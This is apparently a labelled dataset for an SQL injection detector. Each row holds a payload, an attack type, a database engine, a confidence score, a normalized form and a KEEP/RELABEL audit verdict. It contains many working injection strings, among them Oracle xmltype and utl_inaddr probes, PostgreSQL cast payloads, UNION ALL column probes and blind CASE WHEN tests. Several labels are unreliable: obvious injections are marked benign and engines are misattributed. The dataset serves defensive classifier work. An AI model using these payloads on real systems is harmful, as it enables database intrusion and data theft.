payload_norm,sqli_type,db_engine,confidence,reasoning,payload_inner,wrapper_detected,strip_depth,payload_delex_v2,verdict,critique_reasons
select ( case when ( 7019 = 1998 ) then 7019 else 7019* ( select 7019 from mysql.db ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,select ( case when ( 7019 = 1998 ) then 7019 else 7019* ( select 7019 from mysql.db ) end ) #,False,0,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) #,KEEP,
SELECT sail ( s ) FROM mouse UNION ALL,benign,generic,1.0,Normal SELECT with function and UNION ALL,SELECT sail ( s ) FROM mouse UNION ALL,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__ union all,RELABEL,benign payload contains 'union' (likely false negative)
"port fangos, 183,",benign,generic,0.9,not_sql_injection,"port fangos, 183,",False,0,"__IDENT__ __IDENT__ , __INT__ ,",RELABEL,reasoning too short (17 chars)
1 ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 1260 = 1260,out_of_band,oracle,0.9,utl_inaddr,1 ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 1260 = 1260,False,0,__INT__ ) ) and __INT__ = utl_inaddr . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) and ( ( __INT__ = __INT__,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6)
"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",False,0,"-__INT__' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",RELABEL,benign payload contains 'union' (likely false negative)
"select * from users WHERE username = ""1%\' ) ) ) or username = ""-1254"" or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,"1%\' ) ) ) or username = ""-1254"" or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,"__INT__ % \' ) ) ) or __IDENT__ = __STR__ or __IDENT__ = ""-__INT__\' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ) --",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"SELECT modern,decide,dirt,easily,safety ( ( frame JOIN acres ON crew.won = bean.alike ) INNER JOIN ranON Orders.moon = pot.columnID )",benign,generic,1.0,SELECT with multiple INNER JOINs - normal SQL,"SELECT modern,decide,dirt,easily,safety ( ( frame JOIN acres ON crew.won = bean.alike ) INNER JOIN ranON Orders.moon = pot.columnID )",False,0,"select __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ( ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ ) inner join __IDENT__ __IDENT__ = __IDENT__ )",KEEP,
end and ( ( ( 'gqhc' = 'gqhc,boolean_blind,generic,0.5,where_equality,end and ( ( ( 'gqhc' = 'gqhc,False,0,end and ( ( ( __STR__ = '__IDENT__,RELABEL,reasoning too short (14 chars); confidence too low (0.50)
"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,oracle,0.9,cast for PostgreSQL injection,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555",False,0,"select * from __IDENT__ where __IDENT__ = __INT__\' ) ) and __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ) and ( ( \'__IDENT__\' like \'__IDENT__ and __IDENT__ = ""-__INT__\' ) ) as __IDENT__ where __INT__ = __INT__",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"select * from users WHERE username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-6665\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.95,Oracle XMLType + LIKE operator,"select * from users WHERE username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-6665\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",False,0,"select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __IDENT__ = ""-__INT__\' ) ) ) or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual )",KEEP,
"select * from users WHERE username = ""1\' and username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'opyp\' = \'opyp""",error_based,oracle,0.95,Oracle xmltype extraction,"1\' and username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'opyp\' = \'opyp",True,1,"__INT__\' and __IDENT__ = ""__INT__\' ) ) and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and ( ( \'__IDENT__\' = \'__IDENT__",KEEP,
1'+ ( select iwbs where 4939 = 4939,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,1'+ ( select iwbs where 4939 = 4939,False,0,__INT__' + ( select __IDENT__ where __INT__ = __INT__,KEEP,
"select * from users WHERE username = ""-3978 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- mtun"" and username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505""",error_based,oracle,0.9,cast for PostgreSQL injection,-3978 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- mtun,True,1,-__INT__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- __IDENT__,KEEP,
"SELECT * FROM twice WHERE tropical BETWEEN ""bow"" AND ""dress""",benign,mysql,0.9,not_sql_injection,"SELECT * FROM twice WHERE tropical BETWEEN ""bow"" AND ""dress""",False,0,select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""1\' ) ) ) or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",error_based,oracle,0.95,Oracle xmltype extraction,"1\' ) ) ) or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",True,1,__INT__\' ) ) ) or __IDENT__ = __INT__\' || ( select \'__IDENT__\' from dual where __INT__ = __INT__ and __IDENT__ = -__INT__\' where __INT__ = __INT__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) --,KEEP,
select ( case when ( 4059 = 7807 ) then 4059 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.5,where_equality,select ( case when ( 4059 = 7807 ) then 4059 else 1/ ( select 0 ) end ) --,False,0,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ / ( select __INT__ ) end ) --,RELABEL,reasoning too short (14 chars); confidence too low (0.50)
"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 or username = ""1%"" or username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.95,Oracle XMLType error extraction,"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 or username = ""1%"" or username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",False,0,"select * from __IDENT__ where __IDENT__ = __INT__\' || ( select \'__IDENT__\' from dual where __INT__ = __INT__ and __IDENT__ = -__INT__\' where __INT__ = __INT__ or __IDENT__ = __STR__ or __IDENT__ = ""__INT__\' ) ) and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual )",KEEP,
SELECT pilot ( s ) FROM told,benign,generic,1.0,Normal SELECT with function,SELECT pilot ( s ) FROM told,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__,KEEP,
SELECT COUNT ( leather ) FROM play,benign,generic,1.0,Normal SELECT with COUNT aggregate,SELECT COUNT ( leather ) FROM play,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__,KEEP,
"SELECT Orders.welcomerID, Employees.uncle, Employees.somebody FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.directlyID ORDER BY Orders.wifeID",benign,generic,1.0,Normal SELECT with RIGHT JOIN,"SELECT Orders.welcomerID, Employees.uncle, Employees.somebody FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.directlyID ORDER BY Orders.wifeID",False,0,"select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",KEEP,
"1"" ) ) ) and 7135 = 8805#",boolean_blind,generic,0.5,where_equality,"1"" ) ) ) and 7135 = 8805#",False,0,"__INT__"" ) ) ) and __INT__ = __INT__#",RELABEL,reasoning too short (14 chars); confidence too low (0.50)
"SELECT up, afraid, jungle FROM basic WHERE build IS NULL",benign,mysql,0.9,not_sql_injection,"SELECT up, afraid, jungle FROM basic WHERE build IS NULL",False,0,"select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ is null",RELABEL,reasoning too short (17 chars)
"1' ) ) and make_set ( 1002 = 3556,3556 ) and ( ( 'mfao' = 'mfao",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,"1' ) ) and make_set ( 1002 = 3556,3556 ) and ( ( 'mfao' = 'mfao",False,0,1__STR__mfao__STR__mfao,KEEP,
"1%"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,generic,0.85,UNION ALL for union-based,"1%"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,"__INT__ % "" ) ) ) or __INT__ = ( select __IDENT__ ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) --",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7)
SELECT * FROM some FETCH FIRST 3 ROWS ONLY,benign,mysql,0.9,not_sql_injection,SELECT * FROM some FETCH FIRST 3 ROWS ONLY,False,0,select * from __IDENT__ __IDENT__ __IDENT__ __INT__ __IDENT__ __IDENT__,RELABEL,reasoning too short (17 chars)
"-3151%"" ) ) ) union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",union_based,generic,0.7,union_select,"-3151%"" ) ) ) union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",False,0,"-__INT__ % "" ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",RELABEL,reasoning too short (12 chars)
villazala,benign,generic,0.9,not_sql_injection,villazala,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
"-6550' ) where 1675 = 1675 union all select 1675,1675,1675,1675,1675,1675,1675--",union_based,generic,0.7,union_select,"-6550' ) where 1675 = 1675 union all select 1675,1675,1675,1675,1675,1675,1675--",False,0,"-__INT__' ) where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",RELABEL,reasoning too short (12 chars)
"select * from users WHERE username = ""1\' in boolean mode ) and username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee""",error_based,oracle,0.8,Oracle WHERE clause injection,"1\' in boolean mode ) and username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee",True,1,"__INT__\' in __IDENT__ __IDENT__ ) and __IDENT__ = ""-__INT__\' ) ) ) and ( ( ( \'__IDENT__\' = \'__IDENT__",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
SELECT * FROM memory,benign,generic,1.0,Normal SELECT from table,SELECT * FROM memory,False,0,select * from __IDENT__,KEEP,
SELECT apple ( s ) FROM egg UNION ALL,benign,generic,1.0,Normal SELECT with function and UNION ALL,SELECT apple ( s ) FROM egg UNION ALL,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__ union all,RELABEL,benign payload contains 'union' (likely false negative)
"select * from users WHERE username = ""-2733\' ) ) ) and username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'%\' = \'""",error_based,oracle,0.95,xmltype for Oracle error extraction,"-2733\' ) ) ) and username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'%\' = \'",True,1,"-__INT__\' ) ) ) and __IDENT__ = ""__INT__ % \' ) ) ) and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and ( ( ( \' % \' = \'",KEEP,
"select * from users WHERE username = ""-8828%\' ) ) ) and username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.95,xmltype for Oracle error extraction,"select * from users WHERE username = ""-8828%\' ) ) ) and username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",False,0,select * from __IDENT__ where __IDENT__ = __IDENT__ % \' ) ) ) and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ),KEEP,
"select * from users WHERE username = ""-9564 and username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'mndw\' = \'mndw""",error_based,oracle,0.95,xmltype for Oracle error extraction,"-9564 and username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'mndw\' = \'mndw",True,1,"-__INT__ and __IDENT__ = ""__INT__\' ) ) and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and ( \'__IDENT__\' = \'__IDENT__",KEEP,
